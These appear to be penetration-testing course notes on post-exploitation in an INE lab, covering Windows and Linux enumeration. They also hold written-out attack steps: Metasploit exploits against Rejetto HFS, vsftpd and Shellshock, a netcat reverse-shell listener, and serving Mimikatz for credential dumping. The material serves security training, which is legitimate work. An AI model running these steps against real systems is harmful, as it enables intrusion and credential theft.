SS# Introduction

## Post-Exploitation

### Introduction to Post-Exploitation

#### Post-Exploitation

- Post-exploitation is the final phase of the pentest process and consists of the tactics, techniques and procedures that attackers/adversaries undertake after obtaining initial access on a target system.
- In other words, post-exploitation involves what you do or have to do once you gain an initial foothold on the target system.
- Post-exploitation will differ based on the target operating system as well as the target infrastructure.
- The post-exploitation techniques and tools that you canuse will depend on what kind of access you have on the system you have compromised as well as how stealthy you have to be.
- This ultimately means that you will need to utilize different techniques and tools based on the target operating system and its configuration.
- The post-exploitation techniques you can run against the target will need to abide by the rules of engagement agreed upon with the client you are perform the pentest for.

**Note:** When running post-exploitation techniques, you need to be sure that you have the necessary permissions and rights to modify services, system configurations, perform privilege escalation, delete logs etc.

![grafik](https://github.com/user-attachments/assets/37bcb4e2-30fd-4654-a6be-26d736921485)


This diagram outlines the various phases of the pentesting lifecycle and highlights the post exploitation phase and the techniques that fall under the post-exploitation phase
  
### Post-Exploitation Methodology

#### Post-Exploitation Methodology

In order to perform a thorough and complete post-exploitation phase, we need to utilize a structured methodology that encompasses the most important stages of post-exploitation that can be applied during engagements.
This structured, methodological approach ensured that we do not skip/overlook important phases of the post-exploitation phase in addition to providing us with trackable objectives based on each stage.

#### Post-Exploitation Methodology

![grafik](https://github.com/user-attachments/assets/f258672d-32f0-4398-9055-1254d16e44e7)

#### Local Enumeration

![grafik](https://github.com/user-attachments/assets/6b551663-dd57-4e06-956b-4e819717dc27)

#### Transferring Files

![grafik](https://github.com/user-attachments/assets/9cb527ee-3a8b-4efc-95ed-844a626bf567)

#### Upgrading Shells

![grafik](https://github.com/user-attachments/assets/c74a105a-480c-4bbe-9cd6-edb18a8d777c)

#### Privilege Escalation

![grafik](https://github.com/user-attachments/assets/0e3242b3-3d4f-4b80-8cff-e2bdcfe783bb)

#### Persistence 

![grafik](https://github.com/user-attachments/assets/64a60b50-4d17-44f7-8ac2-bacf95f67253)

#### Dumping & Cracking Hashes

![grafik](https://github.com/user-attachments/assets/38ea8a98-afa0-434a-91ee-b2f3a142d716)

#### Pivoting

![grafik](https://github.com/user-attachments/assets/43063dc6-7abd-40fa-b1e8-7cf56a6164a6)

#### Clearing Your Tracks 

![grafik](https://github.com/user-attachments/assets/1a380143-5adb-4f68-a339-e845b3383064)

# Windows Enumeration

## Windows Local Enumeration

### Enumerating System Information

#### Enumerating System Information

- After gaining initial access to a target system, it is always important to learn more about the system like, what OS is running as well as the OS version. This information is useful as it gives us an idea of what we can do and what type of exploits we can run.
- What are we looking for?
  - Hostname
  - OS Name (Windows 7,8 etc)
  - OS Build & Service Pack (Windows 7 SP1 7600)
  - OS Architecture (x64&x86)
  - Installed updates/Hotfixes

### Demo: Enumerating System Information


#### Step 1: Check Connectivity to the Target

To verify if the target machine is reachable, use the **ping** command:

```bash
ping -c 4 demo.ine.local
```

- If the target responds, it indicates that the system is reachable.

#### Step 2: Port Scanning with Nmap

Perform a service version detection scan to identify vulnerable services on the target system using **Nmap**:

```bash
nmap -sV demo.ine.local
```

- The scan should reveal services running on open ports. In this case, port **80** is running **Rejetto HTTP File Server 2.3**.

#### Step 3: Searching for Exploits Using Searchsploit

With the information from the Nmap scan, search for known vulnerabilities affecting **Rejetto HTTP File Server 2.3** using **Searchsploit**:

```bash
searchsploit rejetto
```

- The **Searchsploit** output reveals an available **Metasploit Framework exploit module** that targets this version of **Rejetto**.

#### Step 4: Gaining Access with Metasploit

To exploit the vulnerability, start the **Metasploit Framework** and use the **Rejetto HFS exploit module**:

1. Start **Metasploit**:

    ```bash
    msfconsole
    ```

2. Load the **Rejetto HFS exploit module**:

    ```bash
    use exploit/windows/http/rejetto_hfs_exec
    ```

3. Set the target address:

    ```bash
    set RHOSTS demo.ine.local
    ```

4. Execute the exploit:

    ```bash
    exploit
    ```

If successful, this will open a **Meterpreter session** on the target system.

#### Step 5: Enumerating System Information

Once you gain access to the system, it’s important to gather as much information as possible to understand the system's environment and any potential vulnerabilities.

#### Step 5.1: System Information with Meterpreter

Run the **sysinfo** command to get basic system information:

```bash
sysinfo
```

- Output: Shows the **operating system**, **hostname**, **architecture**, and **domain** of the target system. In this case, the system is running **Windows Server 2012 R2**.

#### Step 5.2: Spawn a Native Shell and Get Hostname

To switch to a native shell session on the target, run:

```bash
shell
```

Once in the shell, you can run native Windows commands, such as getting the hostname:

```bash
hostname
```

#### Step 5.3: Detailed System Information

For more detailed system information, such as hardware details and a list of installed Windows updates, use the **systeminfo** command:

```bash
systeminfo
```

- This provides critical details, including **Windows version**, **OS build number**, **hardware configuration**, and **installed HotFixes**.

You can also retrieve a detailed list of installed updates, including the **HotFix IDs** and **installation dates**, by running the following **WMIC** command:

```bash
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

- Output: Displays when each update was installed and its **HotFix ID**, which helps identify potential vulnerabilities or missing patches.

#### Why Is This Information Important?

- **Installed HotFixes** and **system details** provide insight into whether the system is missing critical updates or patches that could allow for privilege escalation or lateral movement.
- Knowing the **operating system** version, build number, and installed patches helps you determine if there are any known vulnerabilities that can be exploited to further compromise the system.

---

#### Conclusion

In this demo, we:
1. Checked connectivity to the target system.
2. Used **Nmap** to identify services running on the target.
3. Found an exploit for **Rejetto HTTP File Server 2.3** using **Searchsploit**.
4. Exploited the service using **Metasploit** to gain a **Meterpreter session** on the target.
5. Enumerated system information, including the **Windows version**, **installed updates**, and other details, to identify potential vulnerabilities.

This process is critical in any penetration test as it helps gather useful information that can be used to further escalate privileges or move laterally across the network.

### Enumerating Users & Groups

- After gaining initial access to a target system, it is always important to learn more about the system like, what user account you have access to and other user accounts on the system.
- What are we looking for?
  - Current user & privileges
  - Additional user information
  - Other users on the system
  - Groups
  - Members of the built-in administrator group

### Demo: Enumerating Users & Groups

#### Step 1: Start Metasploit and Exploit Rejetto HFS

Start **Metasploit**:

```bash
msfconsole
```

Load the **Rejetto HFS exploit module**:

```bash
use exploit/windows/http/rejetto_hfs_exec
```

Set the target address:

```bash
set rhosts demo.ine.local
```

Run the exploit to gain a **Meterpreter session**:

```bash
run
```

#### Step 2: Check User ID and Privileges

Once we have a **Meterpreter session**, check the current user and privileges:

```bash
getuid
getprivs
```

#### Step 3: Enumerating Logged-On Users Using Metasploit

Background the session:

```bash
background
```

Search for the **enum_logged_on_users** module:

```bash
search logged_on
```

Use the module:

```bash
use post/windows/gather/enum_logged_on_users
```

Set the **Meterpreter session ID**:

```bash
set session 1
```

Run the module:

```bash
run
```

#### Step 4: Return to the Meterpreter Session

Return to the **Meterpreter session** to continue manual enumeration:

```bash
sessions 1
```

### ### Performing User & Group Enumeration Manually

Switch to a **native shell** to perform manual enumeration:

```bash
shell
```

Run the following commands to enumerate users, groups, and privileges:

- **Check privileges** of the current user:

    ```bash
    whoami /priv
    ```

- **Query logged-on users**:

    ```bash
    query user
    ```

- **List all local users**:

    ```bash
    net users
    ```

- **Check details of the Administrator account**:

    ```bash
    net user administrator
    ```

- **List local groups**:

    ```bash
    net localgroup
    ```

- **List members of the Administrators group**:

    ```bash
    net localgroup administrators
    ```

### Conclusion

In this demo, we:
1. Used **Metasploit** to gain access to the target system via a **Meterpreter session**.
2. Ran **Metasploit's post-exploitation module** to enumerate logged-on users.
3. Performed manual **user and group enumeration** using native **Windows commands**.

This process helps in identifying user accounts and privilege levels, which can be useful for further exploitation or privilege escalation.

#### Enumerating Network Information

- What are we looking for?
  - Current IP address & network adapter
  - Internal networks
  - TCP/UDP services running and their respective ports
  - Other hosts on the network
  - Routing table
  - Windows Firewall state

### Demo: Enumerating Network Information

#### Step 1: Start Metasploit and Exploit Rejetto HFS

Start **Metasploit**:

```bash
msfconsole
```

Load the **Rejetto HFS exploit module**:

```bash
use exploit/windows/http/rejetto_hfs_exec
```

Set the target address:

```bash
set rhosts demo.ine.local
```

Run the exploit to gain a **Meterpreter session**:

```bash
run
```

#### Step 2: Open a Shell Session

Switch to a **native shell** to begin enumerating network information:

```bash
shell
```

#### Step 3: Enumerating Network Configuration

To gather network information such as the **IP address** and **adapter details**, use the following commands:

- Display **IP configuration**:

    ```bash
    ipconfig
    ```

- Display detailed **IP configuration and adapter info**:

    ```bash
    ipconfig /all
    ```

#### Step 4: Displaying the Routing Table

To view the system's **routing table**:

```bash
route print
```

#### Step 5: Viewing the ARP Table

The **ARP table** lists all devices on the network that the system has communicated with:

```bash
arp -a
```

#### Step 6: Listing Open Ports and Services

Use **netstat** to list open ports, active connections, and services running on the system:

```bash
netstat -ano
```

#### Step 7: Working with the Windows Firewall

Check the state of the **Windows Firewall** using **netsh**:

- View basic firewall state:

    ```bash
    netsh firewall show state
    ```

- For newer Windows versions, use the following **netsh** commands for **Advanced Firewall**:

    ```bash
    netsh advfirewall firewall state
    ```

    ```bash
    netsh advfirewall
    ```

    ```bash
    netsh advfirewall firewall help
    ```

- Dump current firewall rules to review configuration:

    ```bash
    netsh advfirewall firewall dump
    ```

- Show the state of all firewall profiles (domain, private, public):

    ```bash
    netsh advfirewall show allprofiles
    ```

- **Note**: **netsh advfirewall** allows managing firewall settings, including creating listeners or configuring ports for communication.

#### Conclusion

In this demo, we:
1. Used **Metasploit** to gain access to the target system via a **Meterpreter session**.
2. Used native Windows commands to gather detailed **network information**:
   - Checked the IP configuration, routing table, and ARP table.
   - Listed open ports and services.
   - Investigated the **Windows Firewall** configuration.

This information can be useful for identifying potential attack vectors, open ports for further exploitation, and understanding the network topology of the target environment.

### Enumerating Processes & Services

- After gaining initial access to a target system, it is always important to learn more about the system like, what processes, sevices and scheduled tasks are currently running.
- What are we looking for?
  - Running processes & services
- A process is an instance of a running executable (.exe) or program.
- A service is a process which runs in the background and does not interact with the desktop.

### Demo: Enumerating Processes & Services

#### Step 1: Start Metasploit and Exploit Rejetto HFS

Start **Metasploit**:

```bash
msfconsole
```

Load the **Rejetto HFS exploit module**:

```bash
use exploit/windows/http/rejetto_hfs_exec
```

Set the target address:

```bash
set rhosts demo.ine.local
```

Run the exploit to gain a **Meterpreter session**:

```bash
run
```

#### Step 2: Enumerating Running Processes

To list all currently running processes, use the following command in the **Meterpreter session**:

```bash
ps
```

#### Step 3: Migrating to a Stable Process

It’s often beneficial to migrate the **Meterpreter session** to a stable process such as **explorer.exe**. First, identify the **process ID (PID)** of `explorer.exe`:

```bash
pgrep explorer.exe
```

Once the process is found, migrate to it by specifying the PID:

```bash
migrate 2176
```

Migration will allow us to maintain a more stable connection. After migration, check the system architecture:

```bash
sysinfo
```

#### Step 4: Checking if a Specific Process is Running

To check if a specific process, such as **hfs.exe**, is running:

```bash
pgrep hfs.exe
```

#### Step 5: Enumerating Processes & Services via Shell

Switch to a **native shell** to list running processes and services:

```bash
shell
```

- **List all running services**:

    ```bash
    net start
    ```

- **List services in brief using **WMIC** (Windows Management Instrumentation Command)**:

    ```bash
    wmic service list brief
    ```

- **List processes with their associated services**:

    ```bash
    tasklist /SVC
    ```

#### Step 6: Enumerating Scheduled Tasks

Misconfigured **scheduled tasks** can sometimes be used to elevate privileges. Use the following commands to list them:

- **Query scheduled tasks** in a simple list format:

    ```bash
    schtasks /query /fo LIST
    ```

- **Query detailed information** on scheduled tasks:

    ```bash
    schtasks /query /fo LIST /v
    ```

This will display all scheduled tasks and detailed information, which could be useful for identifying potential misconfigurations or escalation vectors.

### Conclusion

In this demo, we:
1. Used **Meterpreter** to enumerate running processes on the target system.
2. Migrated to a stable process, **explorer.exe**, for a more reliable connection.
3. Switched to a **native shell** to list running services and processes using **net start**, **WMIC**, and **tasklist**.
4. Enumerated **scheduled tasks**, which could be potential targets for privilege escalation.

Understanding the processes and services running on a target system is critical for identifying misconfigurations, potential targets for further exploitation, or establishing persistence on the system.

### Automating Windows Local Enumeration

- In addition to performing local enumeration manually, we can also automate the process with the help of a few scripts and MSF modules.
- While local enumeration techniques/commands are important to know, as a pentester, we will need to be time efficient. As a result, we will need to learn how to utilize various automated enumeration scripts.
- In addition to automating the process of enumeration information like system information, users & groups etc, these automated enumeration scripts will also provide us with additional information regarding the target system like; privilege escalation vulnerabilities, locally stored passwords etc.

#### Windows Local Enum Scripts

- JAWS - just another Windows (enum) Scirpt - Jaws is a powershell script designed to help pentesters quickly identify potential privilege escalation vectors on Windows systems. It is written using Powrshell 2.0 so it should run on every Windows version since Win 7.
- GitHub Repo: https://github.com/411Hall/JAWS


### Demo: Automating Windows Local Enumeration

#### Step 1: Gaining Initial Access to the Target

First, perform an Nmap scan to identify any services running on the target system, such as **WinRM** (Windows Remote Management):

```bash
nmap -sV -p 5985 demo.ine.local
```

If **WinRM** is available, use **Metasploit** to gain access:

1. Start **Metasploit**:

    ```bash
    msfconsole
    ```

2. Use the **WinRM script execution exploit**:

    ```bash
    use exploit/windows/winrm/winrm_script_exec
    ```

3. Configure the target address and credentials:

    ```bash
    set rhosts demo.ine.local
    set USERNAME administrator
    set PASSWORD tinkerbell
    set FORCE_VBS true
    ```

4. Run the exploit:

    ```bash
    run
    ```

5. Once you have access, check basic system information:

    ```bash
    sysinfo
    getuid
    ```

#### Step 2: Automated Enumeration with Metasploit

Once you have a **Meterpreter session**, you can use several **Metasploit post-exploitation modules** to automate local enumeration on the target.

1. **Show mounted drives**:

    ```bash
    show_mount
    ```

2. Background the session:

    ```bash
    background
    ```

3. Useful MSF enumeration modules:

    - **Enumerate user privileges**:

        ```bash
        use post/windows/gather/win_privs
        ```

    - **Enumerate logged-on users**:

        ```bash
        use post/windows/gather/enum_logged_on_users
        ```

    - **Check if the system is running in a virtual machine**:

        ```bash
        use post/windows/gather/checkvm
        ```

    - **Enumerate installed applications** (useful for identifying potentially vulnerable software):

        ```bash
        use post/windows/gather/enum_application
        ```

    - **Enumerate computers connected to the same network**:

        ```bash
        use post/windows/gather/enum_computers
        ```

    - **Enumerate installed patches**:

        ```bash
        use post/windows/gather/enum_patches
        ```

    - **Enumerate shared drives**:

        ```bash
        use post/windows/gather/enum_shares
        ```

#### Step 3: Using JAWS (Just Another Windows (Enum) Script)

**JAWS** is a PowerShell script used for automating the local enumeration of Windows machines. To use it:

1. Copy the content of the **JAWS** script to your lab environment (under **root/Desktop/jaws-enum.ps1**).

2. Return to your **Meterpreter session** and create a temporary directory on the target machine:

    ```bash
    sessions 1
    cd C:\
    mkdir Temp
    cd Temp
    ```

3. Upload the **JAWS** script to the target system:

    ```bash
    upload /root/Desktop/jaws-enum.ps1
    ```

4. Open a shell to execute the script:

    ```bash
    shell
    ```

5. List the contents of the current directory to verify the script is uploaded:

    ```bash
    dir
    ```

6. Execute the **JAWS** script using PowerShell and output the results to a file:

    ```bash
    powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt
    ```

7. Exit the shell and return to the **Meterpreter session** using **CTRL + C**.

8. Download the results file to your local machine for further analysis:

    ```bash
    download jaws-enum.txt
    ```

- The output contains a lot of useful information for further privilege escalation or enumeration.

#### Conclusion

In this demo, we:
1. Gained access to the target system using **WinRM** and **Metasploit**.
2. Automated local enumeration with **Metasploit**'s post-exploitation modules.
3. Used the **JAWS** script for deeper enumeration of the target, obtaining valuable information such as running processes, installed patches, and potential privilege escalation vectors.

Automating local enumeration saves time and ensures that no critical system information is missed, especially when preparing for further exploitation or privilege escalation.

# Linux Enumeration

## Linux Local Enumeration

### Enumerating System Information

- After gaining initial access to a target systen, it is always important to learn more about the system like, what OS is running as well as the OS version. This information is very useful as it gives us an idea of what we can do and what type of exploits we can run.
- What are we looking for?
  - Hostname
  - Distribution & distribution release version
  - Kernel version & architecture
  - CPU information
  - Disk information & mounted drives
  - Installed packages/software

### Demo: Enumerating System Information

#### Step 1: Gaining Initial Foothold on the Target

First, we perform a service version detection scan using **Nmap** to identify the services running on the target system:

```bash
nmap -sV demo.ine.local
```

Once we identify **vsftpd** as a vulnerable service, we can search for related exploits using **Searchsploit**:

```bash
searchsploit vsftpd
```

#### Step 2: Exploiting the Target with Metasploit

Start **Metasploit**:

```bash
msfconsole
```

Search for the **vsftpd** exploit module:

```bash
search vsftpd
```

Set the target address:

```bash
setg rhosts demo.ine.local
```

Use the **vsftpd backdoor** exploit:

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
```

List the contents of the current directory:

```bash
ls
```

Spawn a **bash shell**:

```bash
/bin/bash -i
```

After interacting with the shell, send the session to the background:

```bash
CTRL + Z
```

List all active sessions:

```bash
sessions
```

Upgrade the current session to a **Meterpreter session**:

```bash
sessions -u 1
```

Once upgraded, list all sessions:

```bash
sessions
```

Switch to session 2:

```bash
sessions 2
```

#### Step 3: Performing System Enumeration

Switch to a **native shell** to begin enumerating system information:

```bash
shell
```

Spawn an **interactive bash shell**:

```bash
/bin/bash -i
```

Change to the root directory:

```bash
cd /root
```

- **Display the hostname** of the system:

    ```bash
    hostname
    ```

- **Show information about the operating system**:

    ```bash
    cat /etc/issue
    cat /etc/*release
    ```

- **Display detailed information about the system kernel**:

    ```bash
    uname -a
    uname -r
    ```

- **Display environment variables**:

    ```bash
    env
    ```

- **List detailed information about the CPU architecture**:

    ```bash
    lscpu
    ```

- **Display disk usage**:

    ```bash
    df -h
    ```

- **Display disk usage for ext4 filesystems**:

    ```bash
    df -ht ext4
    ```

- **List all block devices and grep for storage devices**:

    ```bash
    lsblk | grep sd
    ```

- **List all installed packages** on the target system:

    ```bash
    dpkg -l
    ```

### Conclusion

In this demo, we:
1. Gained initial access to the target by exploiting **vsftpd** using Metasploit.
2. Upgraded the shell session to a **Meterpreter session** for easier interaction.
3. Enumerated key system information using basic **Linux commands**:
   - Gathered system information such as the hostname, OS version, kernel details, and CPU architecture.
   - Collected information about mounted filesystems, storage devices, and installed packages.

This enumeration provides essential details for further exploitation, privilege escalation, or maintaining persistence on the target system.

### Enumerating User & Groups on a Linux Target System

- After gaining initial access to a target system, it is always important to learn more about the system like, what user account you have access to and other user accounts on the system.
- What are we looking for?
  - Current user & privileges
  - Other users on the system
  - Groups
 
#### Step 1: Gaining Initial Foothold

To begin enumerating users and groups, we first need to gain access to the target system. Use the same method as before, such as exploiting **vsftpd** or any other vulnerable service.

Once access is obtained, check the user identity:

```bash
meterpreter > getuid
```

Switch to a **native shell**:

```bash
meterpreter > shell
/bin/bash -i
```

Change to the **root directory**:

```bash
cd /root
```

#### Step 2: Enumerating Users

Check the current user:

```bash
whoami
```

Display the groups the current user belongs to:

```bash
groups
```

To check groups for a specific user (e.g., **bob**):

```bash
groups bob
```

List all users on the system by reading the **passwd** file:

```bash
cat /etc/passwd
```

Note that **service accounts** typically have `sbin/nologin`, meaning they are not used for interactive logins. To filter out those accounts:

```bash
cat /etc/passwd | grep -v /nologin
```

The structure of each line in the **passwd** file is as follows:

- `username, userid, groupid, home directory, shell`

List the contents of the **/home directory** to see the user home directories:

```bash
ls -al /home
```

#### Step 3: Managing User Groups

To modify user group memberships, we can add a user (e.g., **bob**) to the **root group** (admin privileges):

```bash
usermod -aG root bob
```

Verify the user's group memberships again:

```bash
groups bob
```

#### Step 4: Enumerating Logins

Check currently logged-in users:

```bash
who
```

Check the last users who logged into the system:

```bash
last
```

View the last login time for each user:

```bash
lastlog
```

#### Conclusion

In this demo, we:
1. Gained initial access to the target system and switched to a **native shell**.
2. Enumerated users and groups by checking the **passwd** file, **groups**, and home directories.
3. Managed group memberships by adding a user to the **root group**.
4. Checked login history with **who**, **last**, and **lastlog**.

This enumeration is essential for understanding the users and access controls on the target system, which can help in identifying potential privilege escalation opportunities.

### Enumerating Network Information

- What are we looking for?
  - Current IP address & network adapter
  - Internal networks
  - TCP/UDP services running and their respective ports
  - Other hosts on the network

### Demo: Enumerating Network Information

#### Step 1: Gaining Initial Foothold

To begin enumerating network information, first gain access to the target system using a previously exploited vulnerability such as **vsftpd** or another service. After gaining a foothold, upgrade your command shell session to a **Meterpreter session**.

#### Step 2: Enumerating Network Information with Meterpreter

Once you have a **Meterpreter session**, begin by gathering network configuration details:

- **Display network interface information**:

    ```bash
    meterpreter > ifconfig
    ```

- **Show network connections, listening ports, and routing tables**:

    ```bash
    meterpreter > netstat
    ```

#### Step 3: Enumerating Network Information with a Shell

Switch to a **native shell** for more detailed network information:

```bash
meterpreter > shell
/bin/bash -i
```

Use the following commands to gather more specific network information:

- **List all network interfaces**:

    ```bash
    ip a s
    ```

- **Show network configurations**:

    ```bash
    cat /etc/networks
    ```

- **Display the hostname of the system**:

    ```bash
    cat /etc/hostname
    ```

- **Show the local DNS entries**:

    ```bash
    cat /etc/hosts
    ```

- **Show the DNS resolver configuration**:

    ```bash
    cat /etc/resolv.conf
    ```

#### Step 4: Displaying ARP Table

To enumerate the **ARP table** (Address Resolution Protocol), use the following commands:

- **Using the shell**:

    ```bash
    arp -a
    ```

- **Using Meterpreter's built-in ARP command**:

    ```bash
    meterpreter > arp
    ```

To return from the shell to the **Meterpreter session**, use the **CTRL + Z** key combination.

#### Conclusion

In this demo, we:
1. Gained access to the target system using a vulnerable service.
2. Enumerated network information using **Meterpreter** and basic shell commands.
3. Gathered critical information such as network interfaces, ARP tables, DNS configurations, and more.

Network enumeration is crucial for understanding the target's network environment, identifying potential attack paths, and planning further exploitation or lateral movement within the network.

### Enumerating Processes & Cron Jobs

- After gaining initial access to a target system, it is always important to learn more about the system like, what processes, services and scheduled tasks are currently running.
- What are we looking for?
  - Running services
  - Cron Jobs
 
### Demo: Enumerating Processes & Cron Jobs

#### Step 1: Gaining Initial Foothold

To begin enumerating processes and cron jobs, first gain access to the target system using a previously exploited vulnerability such as **vsftpd** or another service. Once you have gained access, upgrade your **command shell session** to a **Meterpreter session**.

#### Step 2: Enumerating Processes with Meterpreter

Once you have a **Meterpreter session**, you can begin enumerating the running processes on the target system:

- **List all running processes**:

    ```bash
    meterpreter > ps
    ```

- **Check if a specific process (e.g., **vsftpd**) is running**:

    ```bash
    meterpreter > pgrep vsftpd
    ```

#### Step 3: Enumerating Processes with a Shell

Switch to a **native shell** to run more detailed process commands:

```bash
meterpreter > shell
/bin/bash -i
```

Use the following commands to gather more information about running processes:

- **List all processes along with their user, CPU, and memory usage**:

    ```bash
    ps aux
    ```

- **Search for specific processes like **msfconsole** or **root** processes**:

    ```bash
    ps aux | grep msfconsole
    ps aux | grep root
    ```

- **View processes interactively with top**:

    ```bash
    top
    ```

#### Step 4: Enumerating Cron Jobs

To enumerate **cron jobs**, use the following commands:

- **List the current user's cron jobs**:

    ```bash
    crontab -l
    ```

- **List all cron jobs for the system**:

    ```bash
    ls -al /etc/cron*
    ```

- **View the contents of the cron directory**:

    ```bash
    cat /etc/cron
    ```

Cron jobs are important to enumerate as they might be misconfigured, offering a potential privilege escalation path or persistence mechanism.

#### Conclusion

In this demo, we:
1. Gained access to the target system and upgraded to a **Meterpreter session**.
2. Enumerated processes using both **Meterpreter** and **native shell commands**.
3. Identified and enumerated **cron jobs** running on the system.

Understanding the processes and scheduled tasks (cron jobs) running on a target system helps identify misconfigurations, potential persistence mechanisms, and possible privilege escalation opportunities.

### Automating Linux Local Enumeration

- In addition to performing local enumeration manually, we can also automate the process with the help of a few scripts and MSF modules.
- While local enumeration techniques/commands are important to know, as a pentester, we will need to be time efficient. As a result, we will need to learn how to utilize various automated enumeration scripts.
- In addition to automating the process of enumerating information like system information, users & groups etc., these automated enumeration scripts also provide us with additional information regarding the target system like; privilege escalation vulnerabilites, locally stored passwords etc.

#### Linux Local Enum Scripts
- LinEnum - LinEnum is a simple bash script that automates common Linux local enumeration checks in addition to identifying privilege escalation vulnerabilities.
- GitHub Repo: https://github.com/rebootuser/LinEnum

#### Step 1: Gaining Initial Foothold

To begin automating the local enumeration on the target Linux system, first identify a vulnerable service and exploit it to gain access. In this demo, we will use **Shellshock** to exploit a vulnerable Apache server.

- **Check the network configuration**:

    ```bash
    ifconfig
    ```

- **Perform a service version scan on the target**:

    ```bash
    nmap -sV demo.ine.local
    ```

- **Start Metasploit** and search for the **Shellshock** vulnerability:

    ```bash
    msfconsole
    search shellshock
    ```

- **Use the Shellshock exploit module**:

    ```bash
    use exploit/multi/http/apache_mod_cgi_bash_env_exec
    ```

- **Set the target address and URI**:

    ```bash
    set rhosts demo.ine.local
    set targeturi /gettime.cgi
    ```

- **Run the exploit**:

    ```bash
    run
    ```

Once the exploit is successful, a **Meterpreter session** will be established.

#### Step 2: Automated Enumeration with MSF Modules

Now that we have a **Meterpreter session**, we can use Metasploit post-exploitation modules to automate the enumeration of the system.

- **Enumerate system configurations**:

    ```bash
    use post/linux/gather/enum_configs
    ```

    After running the module, you can manually view the paths of the configuration files by **catting** them.

- **Gather network information**:

    ```bash
    use post/linux/gather/enum_network
    ```

- **Enumerate system details**:

    ```bash
    use post/linux/gather/enum_system
    ```

- **Check if the system is a virtual machine**:

    ```bash
    use post/linux/gather/checkvm
    ```

These post-exploitation modules automate much of the information gathering process.

#### Step 3: Manual Enumeration with LinEnum Script

For a more detailed manual enumeration, we can use the **LinEnum** script.

- **Move to a writable directory on the target (e.g., `/tmp`)**:

    ```bash
    pwd
    cd /tmp
    ls
    ```

- **Upload the LinEnum script to the target**:

    First, copy the **LinEnum** script from your local system to the target. To do this in the lab environment, press **CTRL + SHIFT + ALT** to interact with your host system.

    - Open a text editor on your **local system**, paste the **LinEnum** script, and save it as `LinEnum.sh` on the **Desktop**.
    
    - Then, upload the script from your host machine to the target:

        ```bash
        upload /root/Desktop/LinEnum.sh
        ```

- **Switch to a shell session**:

    ```bash
    shell
    /bin/bash -i
    ```

- **Prepare and run the script**:

    - Check the current user and view important system files:

        ```bash
        id
        whoami
        cat /etc/passwd
        ```

    - Make the **LinEnum** script executable:

        ```bash
        chmod +x LinEnum.sh
        ```

    - Run the **LinEnum** script:

        ```bash
        ./LinEnum.sh
        ```

#### Step 4: Analyze Enumeration Results

The **LinEnum** script will return detailed information about the target system, including:

- Kernel version and hardware information
- User and group listings
- SUID/SGID files
- Cron jobs
- Running services
- Misconfigurations that may allow for **privilege escalation**
- Network interfaces and routing tables

This information is essential for identifying potential **privilege escalation vectors** and further exploitation opportunities.

#### Conclusion

In this demo, we:
1. Gained initial access to a Linux target system using the **Shellshock** vulnerability.
2. Performed automated enumeration using various **MSF post-exploitation modules**.
3. Uploaded and executed the **LinEnum** script for more comprehensive manual enumeration.

By automating local enumeration, we save time and can quickly gather valuable information that may help in identifying further vulnerabilities or misconfigurations to exploit.

## Transferring Files To Windows & Linux Targets

### Setting Up A Web Server With Python

- After obtaining initial access to a target system, we will need to transfer files to the target system.
- In some cases, we will not have access to the target system via a Meterpreter session, and as a result, we will need to use the inbuilt OS specific utilities to facilitate the transfer of files from our system to the target system.
- This process utilizes a two step approach, where we will need to host the files we want to transfer on a web server and download the files hosted on the web server to the target system.
- Python comes with a built-in module known as SimpleHTTPServer (python2) and http.server (python3), that can be used to facilitate a simple HTTP server that gives us standard GET and HEAD request handlers.
- This module can be used to host files in any directory of your system. And can be implemented through a single command in our terminal.

### Demo: Setting Up A Web Server With Python

### Demo: Transferring Mimikatz to a Target System

We are going to transfer **Mimikatz** to a target system using a Python web server for file hosting and retrieval.

---

#### Step 1: Copy Mimikatz Executable

**This command copies the Mimikatz x64 executable into our current directory, which could be our home direcotry or any other directory we prefer.**

```bash
cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe .
```

#### Step 2: Setting Up a Web Server

---

**We set up a Python HTTP server to serve the Mimikatz executable to the target system.**

There are two options depending on our Python version:

Using Python 2:

```bash
python -m SimpleHTTPServer 80
```

Using Python 3:

```bash
python3 -m http.server 80
```

This will start a web server on port 80, serving files from the current directory.

---

#### Step 3: Accessing the Web Server

To retrieve the file from the target system, we copy the Kali Linux IP address and paste it into a browser on the target machine or udr a command to download the file. For example:

```bash
http://[YourIP]:80/mimikatz.exe
```

This URL points to the Mimikatz executable hosted on our Kali machine, allowing the target system to download the file.
Conclusion

By copying the Mimikatz executable and setting up a Python HTTP server, we can easily transfer files to the target system. Once the target system downloads the file, we can proceed with further post-exploitation tasks, such as credential dumping using Mimikatz.

---

### Transferring Files To Windows Targets (Demo)

**1. Scanning the Target with Nmap**

First, we scan the target machine to find out if port 80 is open and which service version is running on it.

```bash
nmap -sV -p 80 demo.ine.local
```

----

**2. Searching for Exploits**

Next, we search for available exploits related to the Rejetto HTTP File Server vulnerability using "searchsploit".

```bash
searchsploit rejetto
```

This lists available exploits. We will use exploit **39161**.

---

**3. Mirroring the Exploit**

We copy the exploit script (39161) from the `searchsploit` database to our working directory:

```
searchsploit -m 39161
```

This will download the exploit script to your current directory.

---

**4. Editing the Exploit Script**

We verify that the script has been copied by listing the files in the current directory:

```
ls -als
```

Now, we open the downloaded script `39161.py` using a text editor:

```
vim 39161.py
```

- Modify the **IP address** in the script to the IP of your **Kali Linux** machine.  
- Change the **port** to an available port, such as **1234**.

---

**5. Setting Up a Netcat Listener**

In a new terminal tab, we set up a listener using **Netcat** to catch the incoming reverse shell from the target:

```
nc -nvlp 1234
```

-nvlp: Stands for no DNS resolution (n), verbose mode (v), listen mode (l), and specify the port (p 1234).

---

**6. Setting Up a Web Server**

In another terminal tab, we set up a simple HTTP server on port 80. This server will later be used to transfer Windows binaries to the target.

```
cd /usr/share/windows-binaries  
python3 -m http.server 80
```

This will serve all files in the `/usr/share/windows-binaries` directory over HTTP on port **80**.

---

**7. Launching the Exploit**

Return to the first terminal tab where the exploit script is located. Now, run the exploit script against the target machine:

```
python 39161.py demo.ine.local 80
```

This command sends the exploit to the target, attempting to give you a **cmd shell** on the **Netcat listener** (set up in step 5).

---

**8. Verifying the Exploit**

In the terminal tab where Netcat is running, check if you have obtained a reverse shell by running the following commands:

```
whoami  
whoami /priv
```

- `whoami`: Identifies the current user.  
- `whoami /priv`: Displays the user's privileges.

---

**9. Setting Up for Mimikatz**

We will use **Mimikatz** to extract credentials from the target. First, we need to set up another HTTP server to serve `mimikatz.exe`:

```
